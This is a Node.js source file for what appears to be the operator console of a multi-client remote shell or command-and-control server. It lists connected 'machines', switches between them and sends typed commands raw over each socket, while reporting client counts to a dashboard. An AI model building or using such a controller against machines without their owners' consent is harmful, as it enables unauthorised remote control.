"use strict";
const dashboard = require("./web_server/ws_server.js");
const socketClients = require("./socket_server/clients.js");
const state = require("./socket_server/state.js");
const readline = require("readline");
const rl = readline.createInterface({
    input  : process.stdin,
    output : process.stdout,
});

const manageServer = {
    getClientData : (client) => {
        try {
            for (let i = 0; i < socketClients.length; i++) {
                if (socketClients[i].address === client.remoteAddress + ":" + client.remotePort) {
                    return socketClients[i];
                }
            }
        } catch {
            console.error("Could not find client.");
            return;
        }
    },
    
    getAndSendNumberOfClients : (server) => {
        server.getConnections((err, count) => {
            if(err) return err;
            else {
                dashboard.uploadClientCount(count);
            }
        });
    },

    gotoMainMenu : () => {
        manageServer.listAvailableClients();
        rl.question("$ ", (cmd) => {
            let client;
            try {
                client = socketClients[cmd].client;
            } catch {
                console.error("Unable to switch to client:",cmd);
                manageServer.gotoMainMenu();

                return;
            }
            state.setCurrentConnection(client);
            manageServer.getAndSendSocketCommand(client);
        });
    },

    getAndSendSocketCommand : async (client) => {
        const currentClient = await manageServer.getClientData(client);
        rl.question(`${currentClient.name} # `, (cmd) => {
            if (cmd === "menu" || cmd === "exit") {
                manageServer.gotoMainMenu();
            } else {
                client.write(cmd);
            }
        });    
    },

    listAvailableClients : () => {
        console.log("Available machines:");
        for (let i = 0; i < socketClients.length; i++) {
            console.log(`${i}) ${socketClients[i].address}`)
        }
    },
};

module.exports = manageServer;